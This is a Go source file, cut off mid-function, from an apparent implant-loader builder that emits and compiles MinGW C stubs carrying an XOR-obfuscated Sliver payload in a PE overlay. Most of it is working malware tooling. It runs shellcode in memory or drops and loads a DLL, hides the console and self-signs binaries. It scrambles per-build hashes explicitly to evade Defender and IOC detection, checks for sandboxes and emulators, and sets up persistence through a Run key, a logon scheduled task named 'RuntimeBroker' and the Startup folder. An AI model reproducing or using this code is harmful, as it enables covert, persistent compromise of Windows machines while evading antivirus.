package loader

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
)

// ToolchainError is a missing host compiler (HTTP 503), not a bad request.
type ToolchainError struct {
	Msg string
}

func (e *ToolchainError) Error() string { return e.Msg }

func useMingwC(opts Options) bool {
	return opts.GOOS == "windows" && (opts.GOARCH == "amd64" || opts.GOARCH == "386")
}

// UseMingwC is true when Windows amd64/386 wrap is compiled as MinGW C.
func UseMingwC(opts Options) bool { return useMingwC(opts) }

func mingwCC(arch string) string {
	switch arch {
	case "amd64":
		return "x86_64-w64-mingw32-gcc"
	case "386":
		return "i686-w64-mingw32-gcc"
	default:
		return ""
	}
}

func lookMingw(arch string) (string, error) {
	cc := mingwCC(arch)
	if cc == "" {
		return "", fmt.Errorf("no mingw triple for windows/%s", arch)
	}
	p, err := exec.LookPath(cc)
	if err != nil {
		pkg := "gcc-mingw-w64-x86-64"
		if arch == "386" {
			pkg = "gcc-mingw-w64-i686"
		}
		return "", &ToolchainError{Msg: cc + " not found on this host; apt install " + pkg}
	}
	return p, nil
}

func cByteLit(b []byte) string {
	if len(b) == 0 {
		return "{0}"
	}
	var s strings.Builder
	s.WriteByte('{')
	for i, x := range b {
		if i > 0 {
			s.WriteByte(',')
		}
		fmt.Fprintf(&s, "0x%02x", x)
	}
	s.WriteByte('}')
	return s.String()
}

func cXorLit(s string, k byte) string {
	b := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		b[i] = s[i] ^ k
	}
	return cByteLit(b)
}

// cIncbinDecl emits a MinGW-compatible .incbin blob (works on GCC 13+;
// C23 #embed / -std=gnu23 do not).
func cIncbinDecl(sym, file string) string {
	return `extern const unsigned char ` + sym + `[];
extern const unsigned char ` + sym + `_end[];
__asm__(
#if defined(__i386__)
".section .rdata,\"dr\"\n"
".globl _` + sym + `\n"
"_` + sym + `:\n"
".incbin \"` + file + `\"\n"
".globl _` + sym + `_end\n"
"_` + sym + `_end:\n"
#else
".section .rdata,\"dr\"\n"
".globl ` + sym + `\n"
"` + sym + `:\n"
".incbin \"` + file + `\"\n"
".globl ` + sym + `_end\n"
"` + sym + `_end:\n"
#endif
);
`
}

func buildWindowsC(opts Options) (*Result, error) {
	cc, err := lookMingw(opts.GOARCH)
	if err != nil {
		return nil, err
	}
	compileMu.Lock()
	defer compileMu.Unlock()
	dir, err := os.MkdirTemp("", "sliv-loader-*")
	if err != nil {
		return nil, fmt.Errorf("temp dir: %w", err)
	}
	defer os.RemoveAll(dir)

	noise := opts.Noise
	if len(noise) == 0 {
		noise = []byte{0}
	}
	var src string
	// Windows MinGW always uses PE-overlay packing (not .incbin into .rdata):
	// large Sliver blobs in .rdata caused DEP/0xc0000005. DiskDLL drops a
	// sibling DLL (AV often quarantines); default mem mode runs shellcode
	// from the overlay in-process with no disk write.
	if opts.DiskDLL {
		src = windowsDiskDLLSource(opts)
	} else {
		src = windowsMemOverlaySource(opts)
	}
	if err := os.WriteFile(filepath.Join(dir, "main.c"), []byte(src), 0o644); err != nil {
		return nil, err
	}

	outPath := filepath.Join(dir, "loader.exe")
	// gnu17: host MinGW is often GCC 13 (no -std=gnu23 / #embed).
	// Payload bytes are pulled in via .incbin, not C23 #embed.
	args := []string{
		"-std=gnu17", "-Os", "-s", "-fno-ident",
		"-o", outPath, "main.c",
		"-lkernel32", "-luser32", "-ladvapi32", "-lshell32", "-lole32", "-luuid",
	}
	// Retain noise/stub bytes so two builds do not share a stub hash.
	// No --gc-sections: overlay hosts keep per-build noise arrays.
	// Console subsystem (no -mwindows): GUI subsystem correlated with
	// 0xc0000005 when calling heavy Go/Donut entrypoints.

	ctx, cancel := context.WithTimeout(context.Background(), compileTimeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, cc, args...)
	cmd.Dir = dir
	var stderr bytes.Buffer
	cmd.Stdout = &stderr
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		msg := strings.TrimSpace(stderr.String())
		if ctx.Err() == context.DeadlineExceeded {
			return nil, fmt.Errorf("compile timed out after %s", compileTimeout)
		}
		if msg == "" {
			msg = err.Error()
		}
		return nil, fmt.Errorf("mingw-c %s/%s: %s", opts.GOOS, opts.GOARCH, msg)
	}
	bin, err := os.ReadFile(outPath)
	if err != nil {
		return nil, fmt.Errorf("read compiled loader: %w", err)
	}
	if len(bin) == 0 {
		return nil, fmt.Errorf("compiler produced an empty file")
	}
	// Per-build PE identity + overlay: pad || XOR(payload) || u64le(len) || magic8
	bin = scramblePEIdentity(bin)
	padN := 32 + int(binary.LittleEndian.Uint16(randBytes(2)))%2048
	bin = append(bin, randBytes(padN)...)
	xorPayload := xorCopy(opts.Payload, combinedXORKey(opts))
	magic := overlayMagic(opts)
	var trailer []byte
	trailer = append(trailer, xorPayload...)
	sz := make([]byte, 8)
	binary.LittleEndian.PutUint64(sz, uint64(len(xorPayload)))
	trailer = append(trailer, sz...)
	trailer = append(trailer, magic...)
	bin = append(bin, trailer...)
	// osslsigncode 8-byte-aligns the Authenticode cert table and inserts
	// 0..7 pad bytes after the trailer. Keep the pre-sign length aligned
	// so cert_off lands immediately after magic (extract also scans back).
	for len(bin)%8 != 0 {
		bin = append(bin, 0)
	}

	wantSign := opts.GOOS == "windows"
	if opts.SignAuthenticode != nil {
		wantSign = *opts.SignAuthenticode
	}
	var signerCN string
	if wantSign {
		signed, cn, err := signEphemeralAuthenticode(bin, opts)
		if err != nil {
			if opts.SignAuthenticode != nil && *opts.SignAuthenticode {
				return nil, fmt.Errorf("authenticode: %w", err)
			}
			// Default path: soft-skip if the toolchain is incomplete.
		} else {
			bin = signed
			signerCN = cn
		}
	}

	engine := "mingw-c-mem"
	if opts.DiskDLL {
		engine = "mingw-c-dll"
	}
	res := &Result{
		Filename:    Filename(opts.Name, opts.GOOS),
		DataB64:     base64.StdEncoding.EncodeToString(bin),
		Size:        len(bin),
		OS:          opts.GOOS,
		Arch:        opts.GOARCH,
		HideConsole: opts.HideConsole,
		Persistence: opts.Persistence,
		PayloadSize: len(opts.Payload),
		Engine:      engine,
		Signed:      signerCN != "",
		SignerCN:    signerCN,
	}
	if opts.DiskDLL {
		// DLL lives in the PE overlay; single-file download (dropped on run).
		res.DllFilename = opts.DLLName
	}
	return res, nil
}

// overlayMagic is a per-build 8-byte trailer marker (not a fixed IOC string).
func overlayMagic(opts Options) []byte {
	m := make([]byte, 8)
	if len(opts.Nonce) >= 8 {
		copy(m, opts.Nonce[:8])
		return m
	}
	mix := append(append([]byte{}, opts.Nonce...), []byte(opts.BuildID)...)
	mix = append(mix, []byte(opts.XORKey)...)
	if len(mix) == 0 {
		return randBytes(8)
	}
	for i := 0; i < 8; i++ {
		m[i] = mix[i%len(mix)] ^ byte(0xA5+i*13)
	}
	return m
}

// scramblePEIdentity rewrites COFF TimeDateStamp so two otherwise-similar
// MinGW stubs do not share a PE header hash prefix.
func scramblePEIdentity(bin []byte) []byte {
	if len(bin) < 0x40 {
		return bin
	}
	e := binary.LittleEndian.Uint32(bin[0x3c:])
	if int(e)+12 >= len(bin) || bin[e] != 'P' || bin[e+1] != 'E' {
		return bin
	}
	out := append([]byte(nil), bin...)
	binary.LittleEndian.PutUint32(out[e+8:], binary.LittleEndian.Uint32(randBytes(4)))
	return out
}

// windowsDiskDLLSource emits a small self-extract host. The XOR'd DLL is
// appended after the PE as an overlay (see buildWindowsC); on run the host
// reads the trailer, drops the DLL next to itself (TEMP fallback), then
// LoadLibrary + CreateThread(8MiB) + Wait — same shape as mini_loader.
// Per-build: XOR nonce, overlay magic, noise blob, PE timestamp, overlay pad.
func windowsDiskDLLSource(opts Options) string {
	dllName := opts.DLLName
	if dllName == "" {
		dllName = "payload.dll"
	}
	export := opts.Export
	if export == "" {
		export = DefaultRDIExport
	}
	hide := bool01(opts.HideConsole)
	key := combinedXORKey(opts)
	magic := overlayMagic(opts)
	wdll := strconv.QuoteToASCII(dllName)
	wdll = wdll[1 : len(wdll)-1]
	exp := strconv.Quote(export)
	xorDecl := "static const unsigned char xor_key[] = " + cByteLit([]byte(key)) + ";\n"
	magicDecl := "static const unsigned char overlay_magic[8] = " + cByteLit(magic) + ";\n"
	noise := opts.Noise
	if len(noise) == 0 {
		noise = []byte{0}
	}
	if len(noise) > 1536 {
		noise = noise[:1536]
	}
	noiseDecl := "static volatile unsigned char noise[] = " + cByteLit(noise) + ";\n" +
		"static volatile unsigned char noise_keep;\n"
	return `#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wchar.h>

#define HIDE_CONSOLE ` + hide + `

` + xorDecl + magicDecl + noiseDecl + windowsPersistC(opts) + `
static DWORD WINAPI disk_start(LPVOID p) {
	((void (*)(void))p)();
	return 0;
}

static int write_buf(const wchar_t *path, const unsigned char *buf, DWORD n) {
	HANDLE f;
	DWORD written = 0;
	BOOL ok;
	if (!path || !path[0] || !buf || n == 0)
		return 0;
	f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE)
		return 0;
	ok = WriteFile(f, buf, n, &written, NULL);
	CloseHandle(f);
	return ok && written == n;
}

static void sibling_dll(const wchar_t *self, wchar_t *out, int cap) {
	wchar_t *slash;
	if (!self || !out || cap < 8)
		return;
	lstrcpynW(out, self, cap);
	slash = wcsrchr(out, L'\\');
	if (!slash)
		slash = wcsrchr(out, L'/');
	if (!slash) {
		out[0] = 0;
		return;
	}
	lstrcpyW(slash + 1, L"` + wdll + `");
}

static void temp_dll(wchar_t *out, int cap) {
	wchar_t dir[MAX_PATH];
	DWORD n;
	if (!out || cap < 8)
		return;
	n = GetTempPathW(MAX_PATH, dir);
	if (!n || n >= MAX_PATH) {
		out[0] = 0;
		return;
	}
	lstrcpynW(out, dir, cap);
	if (lstrlenW(out) + 64 >= cap) {
		out[0] = 0;
		return;
	}
	lstrcatW(out, L"` + wdll + `");
}

/* Overlay is after PE sections and before Authenticode cert (if signed):
 * [PE][pad|xor dll|u64le size|magic8][optional cert]. */
static int seek_abs(HANDLE f, ULONGLONG off) {
	LONG hi = (LONG)(off >> 32);
	DWORD r = SetFilePointer(f, (LONG)off, &hi, FILE_BEGIN);
	return r != INVALID_SET_FILE_POINTER || GetLastError() == NO_ERROR;
}

static ULONGLONG overlay_region_end(HANDLE f, ULONGLONG file_n) {
	unsigned char hdr[256];
	DWORD rd = 0, e_lfanew, i, pe_end = 0, cert_off = 0;
	WORD nsec, optsz, omagic;
	if (!seek_abs(f, 0) || !ReadFile(f, hdr, 64, &rd, NULL) || rd < 64)
		return file_n;
	if (hdr[0] != 'M' || hdr[1] != 'Z')
		return file_n;
	e_lfanew = (DWORD)hdr[0x3c] | ((DWORD)hdr[0x3d] << 8) | ((DWORD)hdr[0x3e] << 16) | ((DWORD)hdr[0x3f] << 24);
	if ((ULONGLONG)e_lfanew + 24 >= file_n)
		return file_n;
	if (!seek_abs(f, e_lfanew) || !ReadFile(f, hdr, sizeof(hdr), &rd, NULL) || rd < 26)
		return file_n;
	if (hdr[0] != 'P' || hdr[1] != 'E')
		return file_n;
	nsec = (WORD)hdr[6] | ((WORD)hdr[7] << 8);
	optsz = (WORD)hdr[20] | ((WORD)hdr[21] << 8);
	omagic = (WORD)hdr[24] | ((WORD)hdr[25] << 8);
	{
		DWORD dd = 0;
		if (omagic == 0x20b)
			dd = 24 + 112;
		else if (omagic == 0x10b)
			dd = 24 + 96;
		if (dd && dd + 4 * 8 + 8 <= rd) {
			DWORD o = dd + 4 * 8;
			cert_off = (DWORD)hdr[o] | ((DWORD)hdr[o + 1] << 8) | ((DWORD)hdr[o + 2] << 16) | ((DWORD)hdr[o + 3] << 24);
		}
	}
	for (i = 0; i < nsec && i < 96; i++) {
		unsigned char sec[40];
		DWORD rsz, rptr, off = e_lfanew + 24 + optsz + i * 40;
		if (!seek_abs(f, off) || !ReadFile(f, sec, 40, &rd, NULL) || rd < 40)
			break;
		rsz = (DWORD)sec[16] | ((DWORD)sec[17] << 8) | ((DWORD)sec[18] << 16) | ((DWORD)sec[19] << 24);
		rptr = (DWORD)sec[20] | ((DWORD)sec[21] << 8) | ((DWORD)sec[22] << 16) | ((DWORD)sec[23] << 24);
		if (rptr && rsz && rptr + rsz > pe_end)
			pe_end = rptr + rsz;
	}
	(void)pe_end;
	if (cert_off > 0 && (ULONGLONG)cert_off <= file_n)
		return cert_off;
	return file_n;
}

static unsigned char *extract_overlay(const wchar_t *self, DWORD *out_n) {
	HANDLE f;
	LARGE_INTEGER sz;
	unsigned char foot[16];
	unsigned char *enc, *plain;
	DWORD n, rd, i, ks;
	ULONGLONG payload_n, tail, file_n;
	if (out_n) *out_n = 0;
	f = CreateFileW(self, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE)
		return NULL;
	if (!GetFileSizeEx(f, &sz) || sz.QuadPart < 16) {
		CloseHandle(f);
		return NULL;
	}
	file_n = (ULONGLONG)sz.QuadPart;
	tail = overlay_region_end(f, file_n);
	if (tail < 16) {
		CloseHandle(f);
		return NULL;
	}
	/* Authenticode may insert 0..7 (rarely more) alignment bytes between
	 * magic8 and the cert table. Probe backwards for a matching trailer. */
	{
		DWORD pad;
		int matched = 0;
		payload_n = 0;
		for (pad = 0; pad < 16; pad++) {
			if (tail < (ULONGLONG)16 + pad)
				break;
			if (!seek_abs(f, tail - 16 - pad) || !ReadFile(f, foot, 16, &rd, NULL) || rd != 16)
				continue;
			for (i = 0; i < 8; i++) {
				if (foot[8 + i] != overlay_magic[i])
					break;
			}
			if (i != 8)
				continue;
			payload_n = (ULONGLONG)foot[0] | ((ULONGLONG)foot[1] << 8) | ((ULONGLONG)foot[2] << 16) | ((ULONGLONG)foot[3] << 24)
				| ((ULONGLONG)foot[4] << 32) | ((ULONGLONG)foot[5] << 40) | ((ULONGLONG)foot[6] << 48) | ((ULONGLONG)foot[7] << 56);
			if (payload_n == 0 || payload_n > 0x10000000ULL)
				continue;
			if (tail < payload_n + 16 + pad)
				continue;
			if (!seek_abs(f, tail - 16 - pad - payload_n))
				continue;
			matched = 1;
			break;
		}
		if (!matched) {
			CloseHandle(f);
			return NULL;
		}
	}
	n = (DWORD)payload_n;
	enc = (unsigned char *)VirtualAlloc(NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!enc) {
		CloseHandle(f);
		return NULL;
	}
	if (!ReadFile(f, enc, n, &rd, NULL) || rd != n) {
		VirtualFree(enc, 0, MEM_RELEASE);
		CloseHandle(f);
		return NULL;
	}
	CloseHandle(f);
	plain = enc;
	ks = (DWORD)sizeof(xor_key);
	if (ks == 0) {
		VirtualFree(enc, 0, MEM_RELEASE);
		return NULL;
	}
	for (i = 0; i < n; i++)
		plain[i] = (unsigned char)(enc[i] ^ xor_key[i % ks]);
	if (out_n) *out_n = n;
	return plain;
}

int main(void) {
	wchar_t self[MAX_PATH], dll[MAX_PATH];
	unsigned char *plain;
	DWORD n = 0;
	HMODULE h;
	void (*entry)(void);
	HANDLE th;

	noise_keep = noise[0];
	if (sizeof(noise) > 1)
		noise_keep ^= noise[(xor_key[0] + 1) % (sizeof(noise) - 1)];

	if (!GetModuleFileNameW(NULL, self, MAX_PATH))
		return 1;

#if HIDE_CONSOLE
	{
		HWND w = GetConsoleWindow();
		if (w)
			ShowWindow(w, SW_HIDE);
		FreeConsole();
	}
#endif

	persist();

	plain = extract_overlay(self, &n);
	if (!plain || n == 0)
		return 2;

	sibling_dll(self, dll, MAX_PATH);
	if (!dll[0] || !write_buf(dll, plain, n)) {
		temp_dll(dll, MAX_PATH);
		if (!dll[0] || !write_buf(dll, plain, n)) {
			VirtualFree(plain, 0, MEM_RELEASE);
			return 3;
		}
	}
	VirtualFree(plain, 0, MEM_RELEASE);

	h = LoadLibraryW(dll);
	if (!h)
		return 4;
	entry = (void (*)(void))GetProcAddress(h, ` + exp + `);
	if (!entry)
		return 5;
	th = CreateThread(NULL, 8u << 20, disk_start, (LPVOID)entry, 0, NULL);
	if (!th) {
		entry();
		for (;;)
			Sleep(0xFFFFFFFFu);
		return 6;
	}
	WaitForSingleObject(th, INFINITE);
	CloseHandle(th);
	return 0;
}
`
}

// windowsMemOverlaySource is the AV-facing host: same PE-overlay packing as
// DiskDLL, but the payload is treated as shellcode and run in-process
// (VirtualProtect + CreateThread). Nothing is written next to the EXE, so
// Defender never sees a plaintext sibling implant DLL on disk.
func windowsMemOverlaySource(opts Options) string {
	hide := bool01(opts.HideConsole)
	key := combinedXORKey(opts)
	magic := overlayMagic(opts)
	xorDecl := "static const unsigned char xor_key[] = " + cByteLit([]byte(key)) + ";\n"
	magicDecl := "static const unsigned char overlay_magic[8] = " + cByteLit(magic) + ";\n"
	noise := opts.Noise
	if len(noise) == 0 {
		noise = []byte{0}
	}
	if len(noise) > 1536 {
		noise = noise[:1536]
	}
	noiseDecl := "static volatile unsigned char noise[] = " + cByteLit(noise) + ";\n" +
		"static volatile unsigned char noise_keep;\n"
	return `#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wchar.h>

#define HIDE_CONSOLE ` + hide + `

` + xorDecl + magicDecl + noiseDecl + windowsPersistC(opts) + `
static DWORD WINAPI mem_start(LPVOID p) {
	((void (*)(void))p)();
	return 0;
}

static int seek_abs(HANDLE f, ULONGLONG off) {
	LONG hi = (LONG)(off >> 32);
	DWORD r = SetFilePointer(f, (LONG)off, &hi, FILE_BEGIN);
	return r != INVALID_SET_FILE_POINTER || GetLastError() == NO_ERROR;
}

static ULONGLONG overlay_region_end(HANDLE f, ULONGLONG file_n) {
	unsigned char hdr[256];
	DWORD rd = 0, e_lfanew, i, pe_end = 0, cert_off = 0;
	WORD nsec, optsz, omagic;
	if (!seek_abs(f, 0) || !ReadFile(f, hdr, 64, &rd, NULL) || rd < 64)
		return file_n;
	if (hdr[0] != 'M' || hdr[1] != 'Z')
		return file_n;
	e_lfanew = (DWORD)hdr[0x3c] | ((DWORD)hdr[0x3d] << 8) | ((DWORD)hdr[0x3e] << 16) | ((DWORD)hdr[0x3f] << 24);
	if ((ULONGLONG)e_lfanew + 24 >= file_n)
		return file_n;
	if (!seek_abs(f, e_lfanew) || !ReadFile(f, hdr, sizeof(hdr), &rd, NULL) || rd < 26)
		return file_n;
	if (hdr[0] != 'P' || hdr[1] != 'E')
		return file_n;
	nsec = (WORD)hdr[6] | ((WORD)hdr[7] << 8);
	optsz = (WORD)hdr[20] | ((WORD)hdr[21] << 8);
	omagic = (WORD)hdr[24] | ((WORD)hdr[25] << 8);
	{
		DWORD dd = 0;
		if (omagic == 0x20b)
			dd = 24 + 112;
		else if (omagic == 0x10b)
			dd = 24 + 96;
		if (dd && dd + 4 * 8 + 8 <= rd) {
			DWORD o = dd + 4 * 8;
			cert_off = (DWORD)hdr[o] | ((DWORD)hdr[o + 1] << 8) | ((DWORD)hdr[o + 2] << 16) | ((DWORD)hdr[o + 3] << 24);
		}
	}
	for (i = 0; i < nsec && i < 96; i++) {
		unsigned char sec[40];
		DWORD rsz, rptr, off = e_lfanew + 24 + optsz + i * 40;
		if (!seek_abs(f, off) || !ReadFile(f, sec, 40, &rd, NULL) || rd < 40)
			break;
		rsz = (DWORD)sec[16] | ((DWORD)sec[17] << 8) | ((DWORD)sec[18] << 16) | ((DWORD)sec[19] << 24);
		rptr = (DWORD)sec[20] | ((DWORD)sec[21] << 8) | ((DWORD)sec[22] << 16) | ((DWORD)sec[23] << 24);
		if (rptr && rsz && rptr + rsz > pe_end)
			pe_end = rptr + rsz;
	}
	(void)pe_end;
	if (cert_off > 0 && (ULONGLONG)cert_off <= file_n)
		return cert_off;
	return file_n;
}

static unsigned char *extract_overlay(const wchar_t *self, DWORD *out_n) {
	HANDLE f;
	LARGE_INTEGER sz;
	unsigned char foot[16];
	unsigned char *enc, *plain;
	DWORD n, rd, i, ks;
	ULONGLONG payload_n, tail, file_n;
	if (out_n) *out_n = 0;
	f = CreateFileW(self, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE)
		return NULL;
	if (!GetFileSizeEx(f, &sz) || sz.QuadPart < 16) {
		CloseHandle(f);
		return NULL;
	}
	file_n = (ULONGLONG)sz.QuadPart;
	tail = overlay_region_end(f, file_n);
	if (tail < 16) {
		CloseHandle(f);
		return NULL;
	}
	{
		DWORD pad;
		int matched = 0;
		payload_n = 0;
		for (pad = 0; pad < 16; pad++) {
			if (tail < (ULONGLONG)16 + pad)
				break;
			if (!seek_abs(f, tail - 16 - pad) || !ReadFile(f, foot, 16, &rd, NULL) || rd != 16)
				continue;
			for (i = 0; i < 8; i++) {
				if (foot[8 + i] != overlay_magic[i])
					break;
			}
			if (i != 8)
				continue;
			payload_n = (ULONGLONG)foot[0] | ((ULONGLONG)foot[1] << 8) | ((ULONGLONG)foot[2] << 16) | ((ULONGLONG)foot[3] << 24)
				| ((ULONGLONG)foot[4] << 32) | ((ULONGLONG)foot[5] << 40) | ((ULONGLONG)foot[6] << 48) | ((ULONGLONG)foot[7] << 56);
			if (payload_n == 0 || payload_n > 0x10000000ULL)
				continue;
			if (tail < payload_n + 16 + pad)
				continue;
			if (!seek_abs(f, tail - 16 - pad - payload_n))
				continue;
			matched = 1;
			break;
		}
		if (!matched) {
			CloseHandle(f);
			return NULL;
		}
	}
	n = (DWORD)payload_n;
	enc = (unsigned char *)VirtualAlloc(NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!enc) {
		CloseHandle(f);
		return NULL;
	}
	if (!ReadFile(f, enc, n, &rd, NULL) || rd != n) {
		VirtualFree(enc, 0, MEM_RELEASE);
		CloseHandle(f);
		return NULL;
	}
	CloseHandle(f);
	plain = enc;
	ks = (DWORD)sizeof(xor_key);
	if (ks == 0) {
		VirtualFree(enc, 0, MEM_RELEASE);
		return NULL;
	}
	for (i = 0; i < n; i++)
		plain[i] = (unsigned char)(enc[i] ^ xor_key[i % ks]);
	if (out_n) *out_n = n;
	return plain;
}

int main(void) {
	wchar_t self[MAX_PATH];
	unsigned char *plain;
	DWORD n = 0, old = 0;
	HANDLE th;

	noise_keep = noise[0];
	if (sizeof(noise) > 1)
		noise_keep ^= noise[(xor_key[0] + 1) % (sizeof(noise) - 1)];

	if (!GetModuleFileNameW(NULL, self, MAX_PATH))
		return 1;

#if HIDE_CONSOLE
	{
		HWND w = GetConsoleWindow();
		if (w)
			ShowWindow(w, SW_HIDE);
		FreeConsole();
	}
#endif

	persist();

	plain = extract_overlay(self, &n);
	if (!plain || n == 0)
		return 2;
	if (!VirtualProtect(plain, n, PAGE_EXECUTE_READWRITE, &old)) {
		VirtualFree(plain, 0, MEM_RELEASE);
		return 3;
	}
	FlushInstructionCache(GetCurrentProcess(), plain, n);
	th = CreateThread(NULL, 8u << 20, mem_start, (LPVOID)plain, STACK_SIZE_PARAM_IS_A_RESERVATION, NULL);
	if (!th)
		th = CreateThread(NULL, 8u << 20, mem_start, (LPVOID)plain, 0, NULL);
	if (!th) {
		((void (*)(void))plain)();
		for (;;)
			Sleep(0xFFFFFFFFu);
		return 4;
	}
	WaitForSingleObject(th, INFINITE);
	CloseHandle(th);
	return 0;
}
`
}

func windowsCSource(opts Options) string {
	k := nameKey(opts)
	key := combinedXORKey(opts)
	pn := opts.PersistName
	if pn == "" {
		pn = "RuntimeBroker"
	}
	dllName := opts.DLLName
	if dllName == "" {
		dllName = "payload.dll"
	}
	export := opts.Export
	if export == "" {
		export = DefaultRDIExport
	}
	xorKeyDecl := "static const unsigned char xor_key[] = " + cByteLit([]byte(key)) + ";\n"
	blobDecl := cIncbinDecl("blob", "cfg.dat")
	dllDecls := ""
	if opts.DiskDLL {
		xorKeyDecl = ""
		blobDecl = ""
		dllDecls = "static const unsigned char e_dll[] = " + cXorLit(dllName, k) + ";\n" +
			"static const unsigned char e_exp[] = " + cXorLit(export, k) + ";\n"
	}
	src := `#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#define DK ((unsigned char)` + strconv.Itoa(int(k)) + `)
#define HIDE_CONSOLE ` + bool01(opts.HideConsole) + `
#define DISK_DLL ` + bool01(opts.DiskDLL) + `

` + xorKeyDecl + dllDecls + `static const unsigned char e_method[] = ` + cXorLit(opts.Persistence, k) + `;
static const unsigned char e_hal9[] = ` + cXorLit("HAL9TH", k) + `;
static const unsigned char e_log[] = ` + cXorLit("sliv-loader.log", k) + `;
static const unsigned char e_run[] = ` + cXorLit(`Software\Microsoft\Windows\CurrentVersion\Run`, k) + `;
static const unsigned char e_app[] = ` + cXorLit("APPDATA", k) + `;
static const unsigned char e_ms[] = ` + cXorLit("Microsoft", k) + `;
static const unsigned char e_win[] = ` + cXorLit("Windows", k) + `;
static const unsigned char e_sm[] = ` + cXorLit("Start Menu", k) + `;
static const unsigned char e_pr[] = ` + cXorLit("Programs", k) + `;
static const unsigned char e_st[] = ` + cXorLit("Startup", k) + `;
static const unsigned char e_sch[] = ` + cXorLit("schtasks", k) + `;
static const unsigned char e_fmt[] = ` + cXorLit(`%S /create /tn %s /sc ONLOGON /tr "%s" /rl LIMITED /f`, k) + `;
static const unsigned char e_off[] = ` + cXorLit("off", k) + `;
static const unsigned char e_rk[] = ` + cXorLit("runkey_hkcu", k) + `;
static const unsigned char e_tk[] = ` + cXorLit("schtask_logon", k) + `;
static const unsigned char e_ln[] = ` + cXorLit("startup_lnk", k) + `;
static const unsigned char e_all[] = ` + cXorLit("all", k) + `;
static const wchar_t persist_name[] = L` + strconv.Quote(pn) + `;
static const char build_id[] = ` + strconv.Quote(opts.BuildID) + `;

` + blobDecl + cIncbinDecl("noise", "n.bin") + `static volatile unsigned char noise_keep;

static void ds(const unsigned char *enc, int n, char *out) {
	int i;
	for (i = 0; i < n; i++) out[i] = (char)(enc[i] ^ DK);
	out[n] = 0;
}

static int lab_fast(void) {
	char v[8];
	DWORD n = GetEnvironmentVariableA("SLIV_BG", v, sizeof(v));
	return n == 1 && v[0] == '1';
}

static void note(const char *msg) {
	wchar_t dir[MAX_PATH], path[MAX_PATH];
	char name[32];
	HANDLE h;
	DWORD w;
	if (lab_fast() || !msg || !msg[0]) return;
	if (!GetTempPathW(MAX_PATH, dir)) return;
	ds(e_log, (int)sizeof(e_log), name);
	if (lstrlenW(dir) + 16 >= MAX_PATH) return;
	lstrcpyW(path, dir);
	MultiByteToWideChar(CP_UTF8, 0, name, -1, path + lstrlenW(path), 32);
	h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE) return;
	WriteFile(h, msg, (DWORD)lstrlenA(msg), &w, NULL);
	WriteFile(h, "\n", 1, &w, NULL);
	CloseHandle(h);
}

static int sandbox(void) {
	wchar_t name[32], want[16];
	char tmp[16];
	DWORD n = 32;
	if (lab_fast()) return 0;
	if (!GetComputerNameW(name, &n)) return 0;
	ds(e_hal9, (int)sizeof(e_hal9), tmp);
	if (!MultiByteToWideChar(CP_UTF8, 0, tmp, -1, want, 16)) return 0;
	return lstrcmpiW(name, want) == 0;
}

static int enough_ram(void) {
	MEMORYSTATUSEX m;
	if (lab_fast()) return 1;
	m.dwLength = sizeof(m);
	if (!GlobalMemoryStatusEx(&m)) return 1;
	return m.ullTotalPhys >= (2ull << 30);
}

static void pause_emu(void) {
	DWORD t0, t1;
	if (lab_fast()) return;
	t0 = GetTickCount();
	Sleep(1800);
	t1 = GetTickCount();
	if (t1 >= t0 && t1 - t0 < 1400) {
		note("emu");
		ExitProcess(0);
	}
}

static void hide_window(void) {
	HWND hwnd;
	if (!HIDE_CONSOLE) return;
	hwnd = GetConsoleWindow();
	if (hwnd) ShowWindow(hwnd, 0);
	FreeConsole();
}

static int method_is(const unsigned char *enc, int n) {
	char want[32], got[32];
	ds(enc, n, want);
	ds(e_method, (int)sizeof(e_method), got);
	return lstrcmpiA(want, got) == 0;
}

static int method_all(void) {
	return method_is(e_all, (int)sizeof(e_all));
}

static wchar_t *last_slash(wchar_t *p) {
	wchar_t *last = NULL;
	for (; p && *p; p++) {
		if (*p == L'\\' || *p == L'/') last = p;
	}
	return last;
}

#if DISK_DLL
static void sibling_dll_path(const wchar_t *exe, wchar_t *out, int cap) {
	char tmp[80];
	wchar_t wdll[80];
	wchar_t *s;
	if (!exe || !out || cap < 8) return;
	lstrcpynW(out, exe, cap);
	s = last_slash(out);
	if (s) s[1] = 0;
	else out[0] = 0;
	ds(e_dll, (int)sizeof(e_dll), tmp);
	if (!MultiByteToWideChar(CP_UTF8, 0, tmp, -1, wdll, 80)) return;
	if (lstrlenW(out) + lstrlenW(wdll) + 1 >= cap) return;
	lstrcatW(out, wdll);
}

static void copy_sibling(const wchar_t *self, const wchar_t *dst_exe) {
	wchar_t src_dll[MAX_PATH], dst_dll[MAX_PATH];
	sibling_dll_path(self, src_dll, MAX_PATH);
	sibling_dll_path(dst_exe, dst_dll, MAX_PATH);
	if (!src_dll[0] || !dst_dll[0]) return;
	if (lstrcmpiW(src_dll, dst_dll) == 0) return;
	CopyFileW(src_dll, dst_dll, FALSE);
}
#endif

static void persist_run(const wchar_t *self) {
	HKEY h = NULL;
	wchar_t sub[128];
	char tmp[96];
	ds(e_run, (int)sizeof(e_run), tmp);
	if (!MultiByteToWideChar(CP_UTF8, 0, tmp, -1, sub, 128)) return;
	if (RegCreateKeyExW(HKEY_CURRENT_USER, sub, 0, NULL, 0, KEY_SET_VALUE, NULL, &h, NULL) != 0 || !h) return;
